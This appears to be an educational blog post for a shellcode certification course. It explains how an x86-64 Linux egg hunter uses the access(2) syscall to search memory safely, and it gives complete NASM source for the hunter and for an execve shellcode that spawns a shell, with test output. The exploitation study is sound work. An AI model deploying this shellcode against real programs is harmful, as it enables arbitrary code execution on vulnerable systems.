Assignment #3 – Egg hunter shellcode
===========================================

The objective of this assignment was to create an "egg hunter" shellcode, configurable for different payloads.

What's an Egg Hunter?
---------------------

Imagine you find a vulnerable program which allows you to inject and execute a small payload, which is too small for you to attain your purpose. You also find there is some other larger program input you control, but you don't know where it will end up in memory. What can you do to execute a larger payload?

Enter egg hunters. An egg hunter is a short shellcode which can search a process's memory for another, larger, shellcode and then execute it. How does it know where the code is in memory? You make it search for an "egg", i.e. a unique pattern in memory which you prepend to your larger shellcode. Hence, the name "egg hunter".

It seems this shellcode was invented or first documented by Skape on [this paper][skape_egg_hunter]. According to Skape's paper an egg hunter should be:

  - robust (it doesn't crash)
  - small (to fit where your larger payload doesn't)
  - fast (so that it won't take a long time to search memory)

Safely searching memory
-----------------------

The egg hunter has to search all the virtual address space (VAS) for the current process. The VAS is divided into memory pages which are "the smallest unit of data for memory management in a virtual memory operating system".

A process's memory consists of multiple regions with different purposes. You normally have regions for `.text`, `.data`, `.bss`, etc. These regions might not be contiguous in the VAS. If we simply search a memory region without checking whether it mapped for the current process we will get a page fault (the infamous "segmentation fault"):

    global _start

    _start:
        mov rdi, 0x10
        mov eax, 0x50905090
        inc eax
        scasd

        mov rax, 60  ; exit
        syscall

    $ nasm -felf64 test.nasm
    $ ld test.o -o test
    $ ./test
    Segmentation fault (core dumped)

What happened above is that we tried to use `scasd` to perform a comparison with the memory address `0x10`. This resulted in a segmentation fault, so it seems this address is not part of the program's memory. We can check this is true by using for example GDB:

    $ gdb -q ./test
    Reading symbols from ./test...
    (No debugging symbols found in ./test)
    (gdb) b _start
    Breakpoint 1 at 0x401000
    (gdb) r
    Starting program: /tmp/test

    Breakpoint 1, 0x0000000000401000 in _start ()
    (gdb) info proc mappings
    process 8386
    Mapped address spaces:

              Start Addr           End Addr       Size     Offset objfile
                0x400000           0x402000     0x2000        0x0 /tmp/test
          0x7ffff7ffb000     0x7ffff7ffe000     0x3000        0x0 [vvar]
          0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 [vdso]
          0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]

We see the first mapped region in the VAS is `0x400000` to `0x402000`, so address `0x10` is clearly not valid.

With this in mind, we need a way to tell which pages are mapped and search only those pages. Otherwise our shellcode will crash. The solution discussed by Skape is to abuse the system call interface to have the kernel validate if a virtual memory address (VMA) is valid.

> When a system call encounters an invalid memory address, most will return the `EFAULT` error code to indicate that a pointer provided to the system call was not valid.

As Skape suggests, we can use for example [`access(2)`][man_2_access] to check the addresses. We will pass it the address we want to check as its first argument and check the return value.

    global _start

    _start:
        ; int access(const char *pathname, int mode)
        mov rax, 21
        mov rdi, 0x10
        syscall

        mov rdi, rax  ; pass return value to exit
        mov rax, 60   ; exit
        syscall

    $ nasm -felf64 test.nasm
    $ ld test.o -o test
    $ ./test
    $ echo $?
    242

You can see the program no longer crashes and it returns 242, which is in fact `-EFAULT` or -14, interpreted as unsigned (misleading, I know).

    $ python3
    >>> import errno
    >>> errno.EFAULT
    14

    $ grep -C1 EFAULT /usr/include/asm-generic/errno-base.h
    #define	EACCES		13	/* Permission denied */
    #define	EFAULT		14	/* Bad address */
    #define	ENOTBLK		15	/* Block device required */

Ok, with this knowledge we're set to write/understand the egg hunter!

Implementation
--------------

I followed Skape's implementation with minor changes, the most significant one being that his shellcode was for x86 and this one is for x86-64. The shellcode is as follows (the egg is `0x50905090`):

    global _start

    _start:
        xor edx, edx
        xor esi, esi
    skip_page:
        or dx, 0xfff   ; minimum page size is 4 kB on x86-(64)
    skip_byte:
        inc rdx
        lea rdi, [rdx+0x4]
        push byte 21
        pop rax
        syscall
        cmp al, 0xf2   ; EFAULT (-14)
        jz skip_page
        mov eax, 0x50905090 - 1   ; subtract so that the hunter does not find itself
        inc eax
        push rdx
        pop rdi
        scasd
        jnz skip_byte
        jmp rdi

Essentially the shellcode searches the egg one memory page at a time. The address currently being checked is kept in RDX. `access(2)` is used to check whether this virtual address is mapped in the process's memory. If it isn't `-EFAULT` is returned and the code jumps to `skip_page`, which `or`s the lower bytes of RDX with `0xfff` and then increments RDX. In practice this results in skipping to the next 4 kB page (the smallest page size in x86-64). For example if the current address is `0x1234` this operation will result in `rdx = hex((0x1234|0xfff)+1) = 0x2000`, a nice, page-aligned address.

If the current address is mapped, the egg value is moved into EAX and the [`scasd`][scas] operation is used to compare EAX with the four bytes starting at RDI. If the comparison fails ZF is reset and we jump to `skip_byte` which increments RDX; and the process repeats for the next address. Otherwise if the egg was found the shellcode executes the larger payload by jumping to the address in RDI. Note that `scasd` increments RDI by four, so the egg is skipped and the code jumps directly to the shellcode. Also note that we are actually using `access` to check `rdx+4` and not RDX. This is because `scasd` compares 4 bytes, and if RDX points to an address near the end of a page and the following addresses are not mapped `scasd` could run into unmapped bytes which would result in a segmentation fault.

You may have noticed one last detail: the value moved into EAX is one less than the value of the egg. Why? Because if the egg hunter itself contains the egg it might find itself instead of the desired payload. A simple way to avoid this is to decrement the value moved into EAX and then increment it in the next instruction.

If you compare my implementation with Skape's you may notice they don't initialise RSI. However, I found that if `access` is called with an "incorrectly specified" mode (the second argument) it will return `-EINVAL` (regardless of the first argument), which the shellcode would gladly interpret as the page being mapped, which might not be true and the shellcode would crash. So I added this initialisation.

Testing
-------

The simplest way I could think of to test the egg hunter was to write a simple program which had an `execve` shellcode in another section other than `.text` (I picked `.data`) and prepend the egg. If the hunter is working correctly it should find this shellcode and spawn a shell.

    global _start

    section .data

        tag: dd 0x50905090

    execve:
        xor eax, eax
        push rax
        push rsp
        pop rdx

        mov rsi, 0x68732f2f6e69622f
        push rsi
        push rsp
        pop rdi

        push rax
        push rdi
        push rsp
        pop rsi

        mov al, 59
        syscall

    section .text

    _start:
        xor edx, edx
        xor esi, esi
    skip_page:
        or dx, 0xfff
    skip_byte:
        inc rdx
        lea rdi, [rdx+0x4]
        push byte 21
        pop rax
        syscall
        cmp al, 0xf2
        jz skip_page
        mov eax, 0x50905090 - 1
        inc eax
        push rdx
        pop rdi
        scasd
        jnz skip_byte
        jmp rdi


    $ nasm -felf64 access.nasm
    $ ld access.o -o access
    $ ./access
    sh-5.0$ whoami
    goncalor

A final comment: I don't think egg hunters are as useful in x86-64 as they were in x86. The address space is now 2^64, so it's just too large to search it all in useful time. I tried to write a C program to test the egg hunter and the egg was placed in a page starting at address `0x555555554000`. On my machine I was able to search about 65 million pages/second. At this rate, reaching the address for the egg would take more than 16 days!

If we know approximately the address range where the egg is typically placed one possible workaround would be to initialise RDX with an address closer to that range, instead of 0.

Thank you for reading. I hope you learned something.


[skape_egg_hunter]: https://web.archive.org/web/20190516191849/http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
[man_2_access]: https://linux.die.net/man/2/access
[scas]: https://www.felixcloutier.com/x86/scas:scasb:scasw:scasd

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
